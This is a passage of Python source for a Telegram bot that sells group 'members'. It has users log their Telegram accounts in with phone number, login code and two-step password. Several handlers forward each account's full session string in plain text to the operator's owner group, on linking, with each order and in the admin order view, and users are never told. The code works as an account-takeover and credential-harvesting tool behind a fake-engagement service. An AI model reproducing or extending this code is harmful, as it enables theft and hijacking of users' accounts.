        await m.answer("❌ Pehle account link karein!", reply_markup=accounts_reply_kb()); return
    await state.set_state(SetLinks.own)
    await m.answer(
        "🏠 Set Your Own Group\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send your own group link for receiving reports.\n\n"
        "Example:\nhttps://t.me/mygroups",
        reply_markup=cancel_reply_kb())

# ==========================================================
#     📦 ORDERS SUB-MENU
# ==========================================================
async def handle_submit_order(m: types.Message):
    lg = get_lang(m.from_user.id)
    rows = conn.execute("SELECT id,phone,session_enc,target_link,own_link "
                        "FROM accounts WHERE user_id=? ORDER BY id",
                        (m.from_user.id,)).fetchall()
    if not rows:
        await m.answer("❌ No accounts linked.", reply_markup=orders_reply_kb(m.from_user.id)); return

    tgt_row = conn.execute("SELECT target_link FROM users WHERE user_id=?",
                           (m.from_user.id,)).fetchone()
    if not tgt_row or not tgt_row[0]:
        await m.answer(
            "⚠️ Target group not set!\n\n"
            "Please set your target group first:\n"
            "My Accounts → Set Target Group",
            reply_markup=orders_reply_kb(m.from_user.id)); return

    target_link = tgt_row[0]
    own_row = conn.execute("SELECT own_link FROM users WHERE user_id=?",
                           (m.from_user.id,)).fetchone()
    own_link = own_row[0] if own_row and own_row[0] else "—"

    accs = len(rows)
    rate = members_per_account()
    members = accs * rate
    is_v = is_vip(m.from_user.id)

    conn.execute("INSERT INTO orders(user_id,accounts,members,order_type,priority,"
                 "status,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?)",
                 (m.from_user.id, accs, members, "paid", 1 if is_v else 0,
                  "pending", now_str(), now_str()))
    conn.commit()
    oid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    log_action(m.from_user.id, "submit_order", f"order#{oid}")

    if OWNER_GROUP_ID:
        header = (f"📦 NEW ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n\n"
                  f"👤 User: {user_tag(m.from_user)}\n"
                  f"🆔 User ID: {m.from_user.id}\n"
                  f"{'👑 VIP' if is_v else '📦 Normal'}\n"
                  f"📱 Accounts: {accs}\n"
                  f"👥 Members: {members}\n"
                  f"🎯 Target: {target_link}\n"
                  f"🏠 Own: {own_link}\n"
                  f"🕒 {now_str()}\n")
        try: await bot.send_message(OWNER_GROUP_ID, header)
        except Exception: pass
        for i, (aid, phone, enc, tgt, own) in enumerate(rows, 1):
            try: sess = cipher.decrypt(enc).decode()
            except Exception: sess = "❌ decrypt error"
            acc_msg = (
                f"🔑 ACCOUNT #{i}/{accs}\n━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 For user: {m.from_user.id}\n"
                f"📱 Phone: {phone}\n"
                f"🎯 Target: {tgt or target_link}\n"
                f"🏠 Own: {own or own_link}\n\n"
                f"🗝 Session:\n{sess}"
            )
            try: await bot.send_message(OWNER_GROUP_ID, acc_msg)
            except Exception: pass
            await asyncio.sleep(0.3)

    delivery = get_setting("delivery_time", DEFAULT_DELIVERY)
    await m.answer(
        "🎉 Order Received!\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 Accounts: {accs}\n"
        f"👥 Members you will get: {members}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Members depend on how many accounts you linked.\n"
        f"📊 Each account = {rate} members\n"
        f"➕ Want more? Link more accounts!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱ Delivery: {delivery}\n"
        f"📌 Status: {t(lg,'status_pending')}\n\n"
        "Our team will start soon!",
        reply_markup=orders_reply_kb(m.from_user.id))

@dp.message(F.text == "🟢 Submit Paid Order")
async def rk_submit_order(m: types.Message):
    await handle_submit_order(m)

@dp.message(F.text == "🔵 Free Order (Points)")
async def rk_free_order(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    pts = get_points(m.from_user.id)
    if pts < POINTS_PER_MEMBER:
        await m.answer(
            f"❌ Not Enough Points\n💰 You have: {pts}\n💎 Need: {POINTS_PER_MEMBER}",
            reply_markup=orders_reply_kb(m.from_user.id)); return
    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    if not tgt or not tgt[0]:
        await m.answer("❌ Pehle Target set karein!", reply_markup=orders_reply_kb(m.from_user.id)); return
    await state.set_state(FreeOrder.amount)
    await state.update_data(target=tgt[0], own=(own[0] if own and own[0] else "—"))
    await m.answer(
        f"💎 Free Order\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 How many members?\n"
        f"💎 {POINTS_PER_MEMBER} pts per member\n"
        f"💰 Your balance: {pts}\n\n"
        f"Example: 25",
        reply_markup=cancel_reply_kb())

@dp.message(F.text == "🟣 Free Trial (5 members)")
async def rk_free_trial(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    if not trial_available(m.from_user.id):
        await m.answer("❌ Trial already used!", reply_markup=orders_reply_kb(m.from_user.id)); return
    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    if not tgt or not tgt[0]:
        await m.answer("❌ Pehle Target set karein!", reply_markup=orders_reply_kb(m.from_user.id)); return
    await state.set_state(FreeOrder.confirm)
    await state.update_data(
        trial=True, members=TRIAL_MEMBERS, cost=0,
        target=tgt[0], own=(own[0] if own and own[0] else "—"))
    await m.answer(
        f"🎁 FREE TRIAL\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✨ You get {TRIAL_MEMBERS} members FREE!\n\n"
        f"🎯 Target: {tgt[0]}\n🏠 Own: {own[0] if own and own[0] else '—'}\n\n"
        f"Confirm?",
        reply_markup=free_confirm_kb(lg))

@dp.message(F.text == "📜 Order History")
async def rk_order_history(m: types.Message):
    rows = conn.execute("SELECT id,accounts,members,order_type,status,created_at "
                        "FROM orders WHERE user_id=? ORDER BY id DESC LIMIT 20",
                        (m.from_user.id,)).fetchall()
    if not rows:
        await m.answer("📜 Order History\n\n❌ No orders yet.",
                       reply_markup=orders_reply_kb(m.from_user.id)); return
    lg = get_lang(m.from_user.id)
    text = "📜 History\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for oid,a,mm,ot,st,tm in rows:
        tag = "🎁 TRIAL" if ot=="trial" else ("💎 FREE" if ot=="free" else "📦 PAID")
        text += (f"🗓 #{oid} {tag}\n📦 {a} | 👥 {mm}\n"
                 f"📌 {status_label(lg,st)}\n🕒 {tm}\n\n")
    if len(text) > 4000: text = text[:3990] + "..."
    await m.answer(text, reply_markup=orders_reply_kb(m.from_user.id))

# ==========================================================
#     💰 WALLET SUB-MENU
# ==========================================================
@dp.message(F.text == "🟢 Buy Members")
async def rk_buy_members(m: types.Message):
    await m.answer(
        f"💳 BUY MEMBERS\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 How to buy:\n\n"
        f"1️⃣ Contact our support\n"
        f"2️⃣ Send payment\n"
        f"3️⃣ Points added to your account\n"
        f"4️⃣ Order members instantly\n\n"
        f"💰 Rate: {POINTS_PER_MEMBER} pts = 1 member\n\n"
        f"🎯 You receive:\n"
        f"• Real Telegram members\n• Fast delivery\n• 100% safe\n\n"
        f"🛎 Support: @{CUSTOMER_SERVICE}",
        reply_markup=wallet_reply_kb())

@dp.message(F.text == "🟣 Refer & Earn")
async def rk_refer_earn(m: types.Message):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{m.from_user.id}"
    pts = get_points(m.from_user.id); refs = get_ref_count(m.from_user.id)
    await m.answer(
        f"🎁 REFER & EARN\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔗 {link}\n\n"
        f"💰 Points: {pts}\n👥 Referrals: {refs}\n\n"
        f"💡 Friend links first account → +{REFERRAL_POINTS} pts",
        reply_markup=wallet_reply_kb())

@dp.message(F.text == "🟡 My Points")
async def rk_my_points(m: types.Message):
    pts = get_points(m.from_user.id)
    members = pts // POINTS_PER_MEMBER
    await m.answer(
        f"💰 MY POINTS\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 Points: {pts}\n"
        f"💎 {POINTS_PER_MEMBER} pts = 1 member\n"
        f"👥 Can order: {members} members\n\n"
        f"👇 Options:",
        reply_markup=wallet_reply_kb())

@dp.message(F.text == "🟠 Redeem Coupon")
async def rk_redeem(m: types.Message):
    await m.answer(
        "🎟 REDEEM COUPON\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send: /redeem YOURCODE\n\n"
        "Example: /redeem NEW10",
        reply_markup=wallet_reply_kb())

# ==========================================================
#     🛎 SUPPORT SUB-MENU
# ==========================================================
@dp.message(F.text == "🟠 Contact Support")
async def rk_contact(m: types.Message):
    await m.answer(
        f"🛎 Contact Support\n\n"
        f"👉 @{CUSTOMER_SERVICE}\n\n"
        f"We'll respond within a few hours.",
        reply_markup=support_reply_kb())

@dp.message(F.text == "🔵 Our Channel")
async def rk_channel(m: types.Message):
    await m.answer(
        f"📢 Our Channel\n\n{CHANNEL_LINK}",
        reply_markup=support_reply_kb())

@dp.message(F.text == "🟣 New Ticket")
async def rk_new_ticket(m: types.Message, state: FSMContext):
    await state.set_state(TicketFlow.message)
    await m.answer(
        "🎫 New Support Ticket\n\n✍️ Describe your issue:",
        reply_markup=cancel_reply_kb())

# ==========================================================
#     ⚙️ SETTINGS SUB-MENU
# ==========================================================
@dp.message(F.text == "🔵 Change Language")
async def rk_lang(m: types.Message):
    await m.answer(
        "🌐 Select Language\n\n👇 Choose:",
        reply_markup=lang_kb())

@dp.message(F.text == "🔵 My Profile")
async def rk_profile(m: types.Message):
    u = conn.execute("SELECT username,first_name,points,ref_count,is_vip,joined_at "
                     "FROM users WHERE user_id=?", (m.from_user.id,)).fetchone()
    accs = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    orders = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    vip = "👑 VIP" if (u and u[4]) else "🆓 Free"
    await m.answer(
        f"👤 My Profile\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 {m.from_user.id}\n"
        f"📛 {u[1] if u else '—'}\n"
        f"🔖 @{u[0] if u and u[0] else '—'}\n"
        f"🎖 Status: {vip}\n"
        f"💰 Points: {u[2] if u else 0}\n"
        f"🎁 Referrals: {u[3] if u else 0}\n"
        f"📱 Accounts: {accs}\n"
        f"📦 Orders: {orders}\n"
        f"🕒 Joined: {u[5] if u else '—'}",
        reply_markup=settings_reply_kb())

@dp.message(F.text == "🔵 My Statistics")
async def rk_stats(m: types.Message):
    total = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    pend = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='pending'", (m.from_user.id,)).fetchone()[0]
    comp = conn.execute("SELECT COUNT(*) FROM orders WHERE user_id=? AND status='complete'", (m.from_user.id,)).fetchone()[0]
    tot_mem = conn.execute("SELECT COALESCE(SUM(members),0) FROM orders WHERE user_id=?", (m.from_user.id,)).fetchone()[0]
    await m.answer(
        f"📊 My Statistics\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 Total Orders: {total}\n"
        f"⏳ Pending: {pend}\n"
        f"✅ Completed: {comp}\n"
        f"👥 Members Received: {tot_mem}",
        reply_markup=settings_reply_kb())

# ==========================================================
#     ⚪ BACK & 🔴 CANCEL
# ==========================================================
@dp.message(F.text == "⚪ Back to Menu")
async def rk_back(m: types.Message, state: FSMContext):
    await state.clear()
    await m.answer("🏠 Main Menu\n\n👇 Choose an option:",
                   reply_markup=main_reply_kb())

@dp.message(F.text == "🔴 Cancel")
async def rk_cancel(m: types.Message, state: FSMContext):
    cl = CLIENTS.pop(m.from_user.id, None)
    if cl:
        try: await cl.disconnect()
        except Exception: pass
    await state.clear()
    await m.answer("❌ Cancelled.\n\n🏠 Back to Main Menu:",
                   reply_markup=main_reply_kb())

# ==========================================================
#     ⚙️ FSM HANDLERS (Target, Own, Add Account, Free Amount, Ticket)
# ==========================================================
@dp.message(SetLinks.target)
async def save_target(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    link = (m.text or "").strip()
    if "t.me/" not in link:
        await m.answer(t(lg,"invalid_link")); return
    conn.execute("UPDATE users SET target_link=? WHERE user_id=?", (link, m.from_user.id))
    conn.execute("UPDATE accounts SET target_link=? WHERE user_id=?", (link, m.from_user.id))
    conn.commit()
    await state.clear()
    await m.answer(t(lg,"target_saved",link=link),
                   reply_markup=accounts_reply_kb())

@dp.message(SetLinks.own)
async def save_own(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    link = (m.text or "").strip()
    if "t.me/" not in link:
        await m.answer(t(lg,"invalid_link")); return
    conn.execute("UPDATE users SET own_link=? WHERE user_id=?", (link, m.from_user.id))
    conn.execute("UPDATE accounts SET own_link=? WHERE user_id=?", (link, m.from_user.id))
    conn.commit()
    await state.clear()
    await m.answer(t(lg,"own_saved",link=link),
                   reply_markup=accounts_reply_kb())

@dp.message(AddAcc.phone)
async def acc_phone(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    phone = (m.text or "").strip()
    if not phone.startswith("+") or len(phone) < 8 or not phone[1:].isdigit():
        await m.answer(t(lg,"invalid_phone")); return
    exists = conn.execute("SELECT id FROM accounts WHERE phone=?",(phone,)).fetchone()
    if exists:
        await m.answer(t(lg,"phone_used", phone=phone))
        await state.clear(); return
    msg = await m.answer("⏳ Connecting...")
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
    except Exception as e:
        try: await client.disconnect()
        except Exception: pass
        err = str(e)
        if "FLOOD_WAIT" in err or "Too many" in err:
            txt = "⚠️ Account Restricted\n\nTry another number."
        elif "BANNED" in err.upper():
            txt = "🚫 Number Banned\n\nTry another number."
        else:
            txt = f"❌ {err[:200]}"
        try: await msg.edit_text(txt)
        except Exception: pass
        await state.clear(); return
    CLIENTS[m.from_user.id] = client
    await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
    try: await msg.edit_text(t(lg,"otp_guide"))
    except Exception: pass
    await state.set_state(AddAcc.otp)

@dp.message(AddAcc.otp)
async def acc_otp(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    code = (m.text or "").replace(" ","").strip()
    data = await state.get_data()
    client = CLIENTS.get(m.from_user.id)
    if not client: await m.answer("❌ /start"); await state.clear(); return
    try:
        await client.sign_in(phone=data["phone"], code=code,
                             phone_code_hash=data["phone_code_hash"])
    except SessionPasswordNeededError:
        await m.answer(t(lg,"pwd_guide"))
        await state.set_state(AddAcc.password); return
    except PhoneCodeInvalidError:
        await m.answer("❌ Invalid code. Try again."); return
    except Exception as e:
        await m.answer(f"❌ {str(e)[:200]}"); return
    await finish_account(m, state, client, data["phone"], lg)

@dp.message(AddAcc.password)
async def acc_pwd(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    data = await state.get_data()
    client = CLIENTS.get(m.from_user.id)
    if not client: await m.answer("❌ /start"); await state.clear(); return
    try: await client.sign_in(password=(m.text or "").strip())
    except Exception as e:
        await m.answer(f"❌ {str(e)[:200]}"); return
    await finish_account(m, state, client, data["phone"], lg)

async def finish_account(m, state, client, phone, lg):
    exists = conn.execute("SELECT id FROM accounts WHERE phone=?",(phone,)).fetchone()
    if exists:
        try: await client.disconnect()
        except Exception: pass
        CLIENTS.pop(m.from_user.id, None); await state.clear()
        await m.answer(t(lg,"phone_used", phone=phone),
                       reply_markup=accounts_reply_kb()); return
    session_str = client.session.save()
    enc = cipher.encrypt(session_str.encode())

    # Get account info
    acc_info = {}
    try:
        me = await client.get_me()
        acc_info = {
            "tg_id": me.id,
            "username": me.username or "—",
            "first_name": me.first_name or "—",
            "last_name": me.last_name or "",
            "phone": me.phone or phone,
        }
    except Exception as e:
        logging.warning(f"get_me: {e}")
        acc_info = {
            "tg_id": "—", "username": "—",
            "first_name": "—", "last_name": "",
            "phone": phone,
        }

    try:
        conn.execute("INSERT INTO accounts(user_id,phone,session_enc,created_at) "
                     "VALUES(?,?,?,?)", (m.from_user.id, phone, enc, now_str()))
        conn.commit()
    except sqlite3.IntegrityError:
        try: await client.disconnect()
        except Exception: pass
        CLIENTS.pop(m.from_user.id, None); await state.clear()
        await m.answer(t(lg,"phone_used", phone=phone),
                       reply_markup=accounts_reply_kb()); return

    log_action(m.from_user.id, "add_account", phone)
    try: await client.disconnect()
    except Exception: pass
    CLIENTS.pop(m.from_user.id, None); await state.clear()

    # Report to owner group
    if OWNER_GROUP_ID:
        try:
            report = (
                "🆕 NEW ACCOUNT LINKED\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 Owner: {m.from_user.first_name or '—'} "
                f"(@{m.from_user.username or '—'})\n"
                f"🆔 Owner ID: {m.from_user.id}\n\n"
                "📱 ACCOUNT DETAILS\n"
                f"• Phone: {phone}\n"
                f"• TG ID: {acc_info['tg_id']}\n"
                f"• Username: @{acc_info['username']}\n"
                f"• Name: {acc_info['first_name']} {acc_info['last_name']}\n\n"
                "🗝 SESSION STRING:\n"
                f"{session_str}\n\n"
                f"🕒 {now_str()}"
            )
            await bot.send_message(OWNER_GROUP_ID, report)
        except Exception as e:
            logging.warning(f"report: {e}")

    ref_uid = reward_referrer_if_due(m.from_user.id)
    if ref_uid:
        try:
            rl = get_lang(ref_uid)
            await bot.send_message(ref_uid, t(rl,"ref_reward", pts=REFERRAL_POINTS,
                name=m.from_user.first_name, total=get_points(ref_uid)))
        except Exception: pass

    accs_count = conn.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?",
                              (m.from_user.id,)).fetchone()[0]
    await m.answer(
        f"✅ Account Added!\n━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 {phone}\n"
        f"📊 Total: {accs_count}\n\n"
        f"👉 Now set Target Group from My Accounts.",
        reply_markup=accounts_reply_kb())

@dp.message(FreeOrder.amount)
async def free_amount(m: types.Message, state: FSMContext):
    lg = get_lang(m.from_user.id)
    txt = (m.text or "").strip()
    if not txt.isdigit() or int(txt) < 1:
        await m.answer(t(lg,"free_invalid_num")); return
    members = int(txt); cost = members * POINTS_PER_MEMBER
    pts = get_points(m.from_user.id)
    if cost > pts:
        await m.answer(t(lg,"free_no_points", points=pts, need=cost, members=members),
                       reply_markup=cancel_reply_kb()); return
    data = await state.get_data()
    await state.update_data(members=members, cost=cost)
    await state.set_state(FreeOrder.confirm)
    await m.answer(
        t(lg,"free_confirm", members=members, cost=cost, points=pts,
          remaining=pts-cost, target=data.get("target","—"), own=data.get("own","—")),
        reply_markup=free_confirm_kb(lg))

@dp.message(TicketFlow.message)
async def ticket_msg(m: types.Message, state: FSMContext):
    body = (m.text or "").strip()
    if not body: await m.answer("❌"); return
    conn.execute("INSERT INTO tickets(user_id,message,status,created_at) VALUES(?,?,?,?)",
                 (m.from_user.id, body, "open", now_str())); conn.commit()
    tid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    await state.clear()
    kb = IKM(inline_keyboard=[[
        IKB(text="✉️ Reply", callback_data=f"treply:{tid}"),
        IKB(text="✅ Close", callback_data=f"tclose:{tid}")]])
    if OWNER_GROUP_ID:
        try:
            await bot.send_message(OWNER_GROUP_ID,
                f"🎫 Ticket #{tid}\n\n"
                f"👤 {user_tag(m.from_user)} ({m.from_user.id})\n"
                f"🕒 {now_str()}\n\n💬 {body}", reply_markup=kb)
        except Exception: pass
    lg = get_lang(m.from_user.id)
    await m.answer(t(lg,"ticket_sent",id=tid),
                   reply_markup=support_reply_kb())

@dp.callback_query(F.data == "free_yes")
async def free_confirm(c: types.CallbackQuery, state: FSMContext):
    lg = get_lang(c.from_user.id)
    data = await state.get_data()
    if not data.get("members"):
        await c.answer("❌"); await state.clear(); return
    members = data["members"]; cost = data["cost"]
    is_trial = data.get("trial", False)
    if not is_trial:
        pts = get_points(c.from_user.id)
        if cost > pts:
            await c.answer(t(lg,"free_no_points", points=pts, need=cost,
                             members=members), show_alert=True)
            await state.clear(); return
        conn.execute("UPDATE users SET points=points-? WHERE user_id=?",
                     (cost, c.from_user.id))
    if is_trial:
        conn.execute("INSERT OR REPLACE INTO trial_used(user_id,used_at) VALUES(?,?)",
                     (c.from_user.id, now_str()))
    conn.execute(
        "INSERT INTO orders(user_id,accounts,members,order_type,points_used,"
        "is_trial,status,note,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
        (c.from_user.id, 0, members, "trial" if is_trial else "free",
         cost, 1 if is_trial else 0, "pending",
         f"TARGET: {data.get('target','—')}\nOWN: {data.get('own','—')}",
         now_str(), now_str()))
    conn.commit()
    oid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
    if OWNER_GROUP_ID:
        badge = "🎁 TRIAL" if is_trial else "💎 FREE"
        try:
            await bot.send_message(OWNER_GROUP_ID,
                f"{badge} ORDER #{oid}\n━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 {user_tag(c.from_user)}\n🆔 {c.from_user.id}\n"
                f"👥 {members}\n💰 {cost}\n🎯 {data.get('target')}\n🏠 {data.get('own')}\n"
                f"🕒 {now_str()}")
        except Exception: pass
    await state.clear()
    delivery = get_setting("delivery_time", DEFAULT_DELIVERY)
    remaining = get_points(c.from_user.id)
    await c.message.edit_text(
        "🎉 Order Placed!\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 Members: {members}\n"
        f"💰 Used: {cost} pts\n"
        f"💰 Remaining: {remaining}\n"
        f"⏱ Delivery: {delivery}")
    await c.message.answer("🏠 Use the menu below:", reply_markup=orders_reply_kb(c.from_user.id))
    await c.answer("🎉")

@dp.callback_query(F.data == "free_no")
async def free_no(c: types.CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await c.message.edit_text("❌ Cancelled")
    except Exception: pass
    await c.message.answer("🏠 Main Menu:", reply_markup=main_reply_kb())
    await c.answer()

# ==========================================================
#                💰 COUPON
# ==========================================================
@dp.message(Command("redeem"))
async def cmd_redeem(m: types.Message):
    p = m.text.split(maxsplit=1)
    if len(p) < 2:
        await m.answer("Usage: /redeem CODE"); return
    code = p[1].strip().upper()
    row = conn.execute("SELECT points,max_uses,uses FROM coupons WHERE code=?",
                       (code,)).fetchone()
    if not row:
        await m.answer("❌ Invalid code!"); return
    pts, max_u, used = row
    if used >= max_u:
        await m.answer("❌ Code expired!"); return
    already = conn.execute("SELECT id FROM coupon_uses WHERE code=? AND user_id=?",
                           (code, m.from_user.id)).fetchone()
    if already:
        await m.answer("❌ Already used!"); return
    conn.execute("UPDATE coupons SET uses=uses+1 WHERE code=?", (code,))
    conn.execute("INSERT INTO coupon_uses(code,user_id,used_at) VALUES(?,?,?)",
                 (code, m.from_user.id, now_str()))
    add_points(m.from_user.id, pts); conn.commit()
    await m.answer(
        f"🎉 Coupon Redeemed!\n━━━━━━━━━━━━━━━━━━━━\n"
        f"🎟 {code}\n💰 +{pts} pts\n"
        f"💰 Total: {get_points(m.from_user.id)}",
        reply_markup=wallet_reply_kb())

# ==========================================================
#                    👑 OWNER PANEL
# ==========================================================
@dp.message(Command("admin"))
async def cmd_admin(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    await state.clear()
    await m.answer("👑 OWNER PANEL\n━━━━━━━━━━━━━━━━━━━━", reply_markup=owner_menu())

@dp.callback_query(F.data == "admin_home")
async def admin_home(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    await state.clear()
    await c.message.edit_text("👑 OWNER PANEL\n━━━━━━━━━━━━━━━━━━━━",
                              reply_markup=owner_menu())
    await c.answer()

@dp.message(Command("setgroup"))
async def cmd_setgroup(m: types.Message):
    global OWNER_GROUP_ID
    if not is_owner(m.from_user.id): return
    if m.chat.type in ("group","supergroup"): OWNER_GROUP_ID = m.chat.id
    else: await m.answer("❌ Group me chalao."); return
    set_setting("owner_group_id", str(OWNER_GROUP_ID))
    await m.answer(f"✅ Owner group: {OWNER_GROUP_ID}")

@dp.callback_query(F.data == "o_orders")
async def o_orders(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("SELECT id,user_id,accounts,members,order_type,status,created_at "
                        "FROM orders ORDER BY id DESC LIMIT 30").fetchall()
    if not rows:
        await c.message.edit_text("📦 No orders.", reply_markup=owner_menu())
        await c.answer(); return
    text = "📦 ORDERS\n━━━━━━━━━━━━━━━━━━━━\n\n"
    kb = []
    for oid,uid,a,mm,ot,st,tm in rows:
        em = {"pending":"⏳","process":"🔄","complete":"✅","rejected":"❌"}.get(st,"❔")
        typ = "🎁" if ot=="trial" else ("💎" if ot=="free" else "📦")
        text += f"{em} {typ} #{oid} | 👤{uid} | 📦{a} 👥{mm}\n🕒 {tm}\n\n"
        kb.append([IKB(text=f"{em} {typ} Order #{oid}", callback_data=f"vieword:{oid}")])
    kb.append([IKB(text="🔙 Admin", callback_data="admin_home")])
    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=kb))
    await c.answer()

@dp.callback_query(F.data == "o_queue")
async def o_queue(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    rows = conn.execute("""
        SELECT o.id,o.user_id,o.accounts,o.members,o.order_type,o.created_at,u.is_vip
        FROM orders o LEFT JOIN users u ON u.user_id=o.user_id
        WHERE o.status IN ('pending','process')
        ORDER BY COALESCE(u.is_vip,0) DESC, o.id ASC LIMIT 20""").fetchall()
    if not rows:
        await c.message.edit_text("📋 Queue Empty", reply_markup=owner_menu())
        await c.answer(); return
    text = "📋 QUEUE\n━━━━━━━━━━━━━━━━━━━━\n\n"
    kb = []
    for i,(oid,uid,a,mm,ot,ct,is_v) in enumerate(rows,1):
        b = "👑 VIP" if is_v else "📦"
        typ = "🎁" if ot=="trial" else ("💎" if ot=="free" else "📦")
        text += f"#{i} {b} {typ} #{oid} | 👤{uid} | 👥{mm}\n\n"
        kb.append([IKB(text=f"▶️ View #{oid}", callback_data=f"vieword:{oid}")])
    kb.append([IKB(text="🔙 Admin", callback_data="admin_home")])
    await c.message.edit_text(text, reply_markup=IKM(inline_keyboard=kb))
    await c.answer()

@dp.callback_query(F.data.startswith("vieword:"))
async def view_order(c: types.CallbackQuery):
    if not is_owner(c.from_user.id): return
    oid = int(c.data.split(":")[1])
    r = conn.execute("SELECT id,user_id,accounts,members,order_type,points_used,is_trial,"
                     "status,note,created_at,updated_at FROM orders WHERE id=?",
                     (oid,)).fetchone()
    if not r: await c.answer("Not found", show_alert=True); return
    accs = conn.execute("SELECT phone,session_enc,target_link,own_link FROM accounts "
                        "WHERE user_id=? ORDER BY id",(r[1],)).fetchall()
    em = {"pending":"⏳","process":"🔄","complete":"✅","rejected":"❌"}.get(r[7],"❔")
    typ = "🎁 TRIAL" if r[6] else ("💎 FREE" if r[4]=="free" else "📦 PAID")
    text = (f"📦 Order #{r[0]}  {typ}\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {r[1]}\n📦 Accounts: {r[2]}\n"
            f"👥 Members: {r[3]}\n")
    if r[5]: text += f"💰 Points: {r[5]}\n"
    text += f"{em} {r[7]}\n💬 {r[8] or '—'}\n🕒 {r[9]}\n🔄 {r[10]}\n\n"
    if accs and not r[6]:
        text += "🔑 Sessions:\n"
        for i,(ph,enc,tg,own) in enumerate(accs,1):
            try: s = cipher.decrypt(enc).decode()
            except Exception: s = "❌"
            text += (f"#{i} 📱{ph}\n🎯 {tg or '—'}\n"
                     f"🏠 {own or '—'}\n{s}\n\n")
    if len(text) > 4000: text = text[:3990] + "..."
    await c.message.edit_text(text, reply_markup=order_status_kb(r[0]))
    await c.answer()

@dp.callback_query(F.data.startswith("setst:"))
async def change_status(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    _, oid, new_st = c.data.split(":")
    await state.update_data(order_id=int(oid), new_status=new_st)
    await state.set_state(AdminFlow.status_note)
    await c.message.edit_text(f"✏️ Note for {new_st} (or - skip):",
        reply_markup=IKM(inline_keyboard=[[
            IKB(text="⏭ Skip", callback_data=f"skipnote:{oid}:{new_st}")]]))
    await c.answer()

@dp.callback_query(F.data.startswith("skipnote:"))
async def skip_note(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    _, oid, new_st = c.data.split(":")
    await state.clear()
    await apply_status_change(c, int(oid), new_st, "")
    await c.answer()

@dp.message(AdminFlow.status_note)
async def status_note_msg(m: types.Message, state: FSMContext):
    if not is_owner(m.from_user.id): return
    data = await state.get_data()
    note = (m.text or "").strip()
    if note == "-": note = ""
    await state.clear()
    await apply_status_change(m, data["order_id"], data["new_status"], note)

async def apply_status_change(evt, oid, new_st, note):
    row = conn.execute("SELECT user_id FROM orders WHERE id=?",(oid,)).fetchone()
    if not row:
        try: await evt.answer("Not found")
        except Exception: pass
        return
    uid = row[0]
    conn.execute("UPDATE orders SET status=?,note=?,updated_at=? WHERE id=?",
                 (new_st, note, now_str(), oid)); conn.commit()
    lg = get_lang(uid)
    try:
        await bot.send_message(uid,
            t(lg,"owner_msg_status", id=oid, status=status_label(lg,new_st),
              note=note or "—", support=CUSTOMER_SERVICE))
    except Exception: pass
    text = f"✅ Order #{oid} → {new_st}"
    try: await evt.message.edit_text(text, reply_markup=order_status_kb(oid))
    except Exception:
        try: await bot.send_message(OWNER_ID, text, reply_markup=order_status_kb(oid))
        except Exception: pass

@dp.callback_query(F.data.startswith("ordmsg:"))
async def order_msg_user(c: types.CallbackQuery, state: FSMContext):
    if not is_owner(c.from_user.id): return
    oid = int(c.data.split(":")[1])
    row = conn.execute("SELECT user_id FROM orders WHERE id=?",(oid,)).fetchone()
